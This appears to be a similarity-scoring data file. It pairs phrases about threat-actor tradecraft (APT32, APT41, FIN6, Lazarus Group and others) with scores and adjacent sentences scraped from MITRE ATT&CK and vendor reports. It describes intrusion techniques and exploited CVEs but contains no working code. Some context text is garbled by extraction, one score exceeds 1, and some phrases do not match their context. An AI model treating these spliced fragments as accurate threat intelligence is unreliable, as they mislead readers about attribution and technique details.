phrase|similarity|adjacent_sentences
APT32 has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.|0.8190387488807642|['The group has also used thepingcommand.', '[8]EnterpriseT1053.005Scheduled Task/Job:Scheduled TaskAPT32has used scheduled tasks to persist on victim systems.', '[1][4][8][5]EnterpriseT1505.003Server Software Component:Web ShellAPT32has used Web shells to maintain access to victim websites.', '[2]EnterpriseT1072Software Deployment ToolsAPT32compromised McAfee ePO to move laterally by distributing malware as a software deployment task.', '[1]EnterpriseT1608.001Stage Capabilities:Upload MalwareAPT32has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting.', '[9].004Stage Capabilities:Drive-by TargetAPT32has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.', '[9]EnterpriseT1218.005System Binary Proxy Execution:MshtaAPT32has used mshta.exe for code execution.', '[4][8].010System Binary Proxy Execution:Regsvr32APT32created aScheduled Task/Jobthat used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory.', 'The group has also used regsvr32 to run their backdoor.', '[5][1][8].011System Binary Proxy Execution:Rundll32APT32malware has used rundll32.exe to execute an initial infection process.', '[8]EnterpriseT1082System Information DiscoveryAPT32has collected the OS version and computer name from victims.']
This method may also evade detection from security products since the execution is masked under a legitimate process.|0.7849083367753802|['access; the resurrection of Emotet, a threat described by Europol as the most dangerous malware in You can listen to the latest episodes via the most popular podcast platforms including Spotify the world; and the over 400-fold increase in Android banking malware year-over-year.', '[154], Google Podcasts [155], Apple Podcasts [156] and PodBean [157].', 'MITRE ATT&CK CONTRIBUTIONS ESET researchers regularly contribute to MITRE ATT&CK [158] a globally accessible knowledge base of adversary tactics and techniques.', 'In T1 2022, ESETs Process Injection: ListPlanting [159] contribution was added to the ATT&CK knowledge base.', 'ListPlanting is a method of executing arbitrary code in the address space of a separate live process.', 'Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.', 'InvisiMole uses ListPlanting to inject code into a trusted process.', 'InvisiMole [160] is a modular spyware program that has been used by the InvisiMole APT group since WHITE PAPERS at least 2013.', 'The InvisiMole group also has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities.', 'It has been discovered on compromised victims in Ukraine and Russia.', 'Gamaredon group [161] infrastructure has been used to download and execute Under the hood of Wslinks multilayered virtual machine [36] the InvisiMole spyware against a small number of victims.']
DLL injection is a method of executing arbitrary code in the address space of a separate live process.|0.7913453486934843|['Among others, his presentation who is talking to researchers, introducing them and their discoveries and offering the listeners a peek covered the hundreds of billions of password guesses aimed to break the protection of RDP remote behind the curtain of how their research came to be.', 'access; the resurrection of Emotet, a threat described by Europol as the most dangerous malware in You can listen to the latest episodes via the most popular podcast platforms including Spotify the world; and the over 400-fold increase in Android banking malware year-over-year.', '[154], Google Podcasts [155], Apple Podcasts [156] and PodBean [157].', 'MITRE ATT&CK CONTRIBUTIONS ESET researchers regularly contribute to MITRE ATT&CK [158] a globally accessible knowledge base of adversary tactics and techniques.', 'In T1 2022, ESETs Process Injection: ListPlanting [159] contribution was added to the ATT&CK knowledge base.', 'ListPlanting is a method of executing arbitrary code in the address space of a separate live process.', 'Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.', 'InvisiMole uses ListPlanting to inject code into a trusted process.', 'InvisiMole [160] is a modular spyware program that has been used by the InvisiMole APT group since WHITE PAPERS at least 2013.', 'The InvisiMole group also has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities.', 'It has been discovered on compromised victims in Ukraine and Russia.']
Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.|0.9688273929255937|['T1094 Custom Adversaries may communicate using a custom command and Command and control protocol instead of encapsulating commands/data in an Control Protocol existing Standard Application Layer Protocol.', 'Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.', 'T1024 Custom Adversaries may use a custom cryptographic protocol or algorithm Cryptographic to hide command and control traffic.', 'A simple scheme, such as Protocol XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.', 'Copyright Leonardo S.p.a. All rights reserved 23 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 T1032 Standard Adversaries may explicitly employ a known encryption algorithm to Cryptographic conceal command and control traffic rather than relying on any Protocol inherent protections provided by a communication protocol.', 'Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.', 'T1158 Hidden Files To prevent normal users from accidentally changing special files on and Directories a system, most operating systems have the concept of a hidden file.', 'These files dont show up when a user browses the file system with a GUI or when using normal commands on the command line.', 'Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls a for Linux and macOS).', 'T1222 File and File and directory permissions are commonly managed by Directory discretionary access control lists (DACLs) specified by the file or Permissions directory owner.', 'File and directory DACL implementations may vary Modification by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.).']
They have also used zero-day exploits.|0.7974875236590371|['By calling the bytesavailable method within the PostScript code, arbitrary code execution is achieved.', 'Identity Although the exact identity of PLATINUM remains unknown, the technical indicators observed so far can help create a profile of the attacker.', 'Usage of multiple backdoors.', 'The different backdoors written by or for the group indicate a considerable investment over time.', 'Research indicates that PLATINUM has used multiple backdoors concurrently at times, which could represent either multiple teams within the activity group performing different campaigns, or different versions of the tools being used against varying victim networks.', 'Zero day exploits.', 'PLATINUM has used several zero-day exploits against their victims.', 'Regardless of whether they researched the exploits themselves or purchased them from independent researchers, the monetary investment required to collect and deploy zero-day exploits at this level is considerable.', 'Victim geography.', 'More often than not, research into targeted attacks shows The monetary in- activity groups becoming opportunistic and attacking topical targets; that is, targets considered valuable based on the geopolitical events of the year.', 'vestment required PLATINUM has consistently targeted victims within a small set of countries in to collect and South and Southeast Asia.']
Cobalt Group had exploited multiple vulnerabilities for execution, including Microsofts Equation Editor , an Internet Explorer vulnerability , CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.|0.7899007940919546|"['[11]The group has used an exploit toolkit known as Threadkit that launches .bat files.', '[1][2][4][11][13][12].005Command and Scripting Interpreter:Visual BasicCobalt Grouphas sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.', ""[1][2][4][11][13][12].007Command and Scripting Interpreter:JavaScriptCobalt Grouphas executed JavaScript scriptlets on the victim's machine."", '[1][2][4][11][13][12]EnterpriseT1543.003Create or Modify System Process:Windows ServiceCobalt Grouphas created new services to establish persistence.', '[4]EnterpriseT1573.002Encrypted Channel:Asymmetric CryptographyCobalt Grouphas used the Plink utility to create SSH tunnels.', '[4]EnterpriseT1203Exploitation for Client ExecutionCobalt Grouphad exploited multiple vulnerabilities for execution, including Microsofts Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.', '[1][2][3][5][6][7][10][12]EnterpriseT1068Exploitation for Privilege EscalationCobalt Grouphas used exploits to increase their levels of rights and privileges.', '[4]EnterpriseT1070.004Indicator Removal:File DeletionCobalt Groupdeleted the DLL dropper from the victims machine to cover their tracks.', '[1]EnterpriseT1105Ingress Tool TransferCobalt Grouphas used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.', ""[2][3]The group's JavaScript backdoor is also capable of downloading files."", '[11]EnterpriseT1559.002Inter-Process Communication:Dynamic Data ExchangeCobalt Grouphas sent malicious Word OLE compound documents to victims.']"
APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.|0.7591248430059332|['[1]EnterpriseT1005Data from Local SystemPatchworkcollected and exfiltrated files from the infected system.', '[1]EnterpriseT1074.001Data Staged:Local Data StagingPatchworkcopied all targeted files to a directory called index that was eventually uploaded to the C&C server.', '[3]EnterpriseT1587.002Develop Capabilities:Code Signing CertificatesPatchworkhas created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware.', '[6]EnterpriseT1189Drive-by CompromisePatchworkhas used watering holes to deliver files with exploits to initial victims.', '[2][4]EnterpriseT1203Exploitation for Client ExecutionPatchworkuses malicious documents to deliver remote execution exploits as part of.', 'The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.', '[1][8][2][5][3][4][6]EnterpriseT1083File and Directory DiscoveryAPatchworkpayload has searched all fixed drives on the victim for files matching a specified list of extensions.', '[1][3]EnterpriseT1574.002Hijack Execution Flow:DLL Side-LoadingAPatchwork.dll that containsBADNEWSis loaded and executed using DLL side-loading.', '[3]EnterpriseT1070.004Indicator Removal:File DeletionPatchworkremoved certain files and replaced them so they could not be retrieved.', '[3]EnterpriseT1105Ingress Tool TransferPatchworkpayloads download additional files from the C2 server.', '[8][3]EnterpriseT1559.002Inter-Process Communication:Dynamic Data ExchangePatchworkleveraged the DDE protocol to deliver their malware.']
APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.|0.8685022251060389|['[5]EnterpriseT1041Exfiltration Over C2 ChannelDuringC0017,APT41used its Cloudflare services C2 channels for data exfiltration.', '[5]EnterpriseT1567Exfiltration Over Web ServiceDuringC0017,APT41used Cloudflare services for data exfiltration.', '[5]EnterpriseT1190Exploit Public-Facing ApplicationAPT41exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.', '[7]APT41leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access.', '[6]DuringC0017,APT41exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.', '[5]EnterpriseT1203Exploitation for Client ExecutionAPT41leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.', '[1]EnterpriseT1068Exploitation for Privilege EscalationDuringC0017,APT41abused named pipe impersonation for privilege escalation.', '[5]EnterpriseT1133External Remote ServicesAPT41compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.', '[1]EnterpriseT1008Fallback ChannelsAPT41used the Steam community page as a fallback mechanism for C2.', '[1]EnterpriseT1083File and Directory DiscoveryAPT41has executedfile /bin/pwdon exploited victims, perhaps to return architecture related information.', '[7]EnterpriseT1589.001Gather Victim Identity Information:CredentialsTo support initial access,APT41gained access to databases with information about existing accounts as well as plaintext and hashed passwords.']
The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.|1.0002|"['[8]EnterpriseT1005Data from Local SystemFIN6has collected and exfiltrated payment card data from compromised systems.', '[7][9][10]EnterpriseT1074.002Data Staged:Remote Data StagingFIN6actors have compressed data from remote systems and moved it to another staging system before exfiltration.', '[1]EnterpriseT1573.002Encrypted Channel:Asymmetric CryptographyFIN6used the Plink command-line utility to create SSH tunnels to C2 servers.', '[1]EnterpriseT1048.003Exfiltration Over Alternative Protocol:Exfiltration Over Unencrypted Non-C2 ProtocolFIN6has sent stolen payment card data to remote servers via HTTP POSTs.', '[7]EnterpriseT1068Exploitation for Privilege EscalationFIN6has used tools to exploit Windows vulnerabilities in order to escalate privileges.', 'The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.', '[1]EnterpriseT1562.001Impair Defenses:Disable or Modify ToolsFIN6has deployed a utility script namedkill.batto disable anti-virus.', '[2]EnterpriseT1070.004Indicator Removal:File DeletionFIN6has removed files from victim machines.', '[1]EnterpriseT1036.004Masquerading:Masquerade Task or ServiceFIN6has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate Windows service.', ""[2]EnterpriseT1046Network Service DiscoveryFIN6used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS."", '[1]EnterpriseT1095Non-Application Layer ProtocolFIN6has used Metasploit Bind and Reverse TCP stagers.']"
MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control .|0.9277191031037945|['Collection Screen Capture T1113 MuddyWater has used malware that can capture screenshots of the victims machine.', 'Archive Collected T1560.001 MuddyWater has used the native Windows cabinet creation tool, makecab.exe , Data: Archive via likely to compress stolen data to be uploaded.', 'Utility Command and Control Application Layer T1071.001 MuddyWater has used HTTP for C2 communications.', 'e.g., Small Sieve beacons and Protocol: Web tasking are performed using the Telegram API over HTTPS.', 'Protocols Proxy: External T1090.002 MuddyWater has controlled POWERSTATS from behind a proxy network to Proxy obfuscate the C2 location.', 'MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to C2.', '6/12Technique Title ID Use Web Service: T1102.002 MuddyWater has used web services including OneHub to distribute remote access Bidirectional tools.', 'Communication Multi-Stage T1104 MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, Channels but a different C2 to send data back.', 'Ingress Tool Transfer T1105 MuddyWater has used malware that can upload additional files to the victims machine.', 'Data Encoding: T1132.001 MuddyWater has used tools to encode C2 communications including Base64 Standard Encoding encoding.', 'Data Encoding: Non- T1132.002 MuddyWater uses tools such as Small Sieve, which employs a custom hex byte Standard Encoding swapping encoding scheme to obfuscate tasking traffic.']
Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.|0.7960214353797384|['[9]EnterpriseT1048.003Exfiltration Over Alternative Protocol:Exfiltration Over Unencrypted Non-C2 ProtocolLazarus Groupmalware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.', '[3][25]EnterpriseT1041Exfiltration Over C2 ChannelLazarus Grouphas exfiltrated data and files over a C2 channel through its various tools and malware.', '[3][24][18]DuringOperation Dream Job,Lazarus Groupexfiltrated data from a compromised host to actor-controlled C2 servers.', '[10]EnterpriseT1567.002Exfiltration Over Web Service:Exfiltration to Cloud StorageDuringOperation Dream Job,Lazarus Groupused a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.', '[9][10]EnterpriseT1203Exploitation for Client ExecutionLazarus Grouphas exploited Adobe Flash vulnerability CVE-2018-4878 for execution.', '[29]EnterpriseT1008Fallback ChannelsLazarus Groupmalware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.', '[3][25]EnterpriseT1083File and Directory DiscoveryLazarus Groupmalware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.', '[3][27][21][22]DuringOperation Dream Job,Lazarus Groupconducted word searches within documents on a compromised host in search of security and financial matters.', '[10]EnterpriseT1589.002Gather Victim Identity Information:Email AddressesLazarus Groupcollected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns.', '[17]EnterpriseT1591Gather Victim Org InformationLazarus Grouphas studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.', '[17]ForOperation Dream Job,Lazarus Groupgathered victim organization information to identify specific targets.']
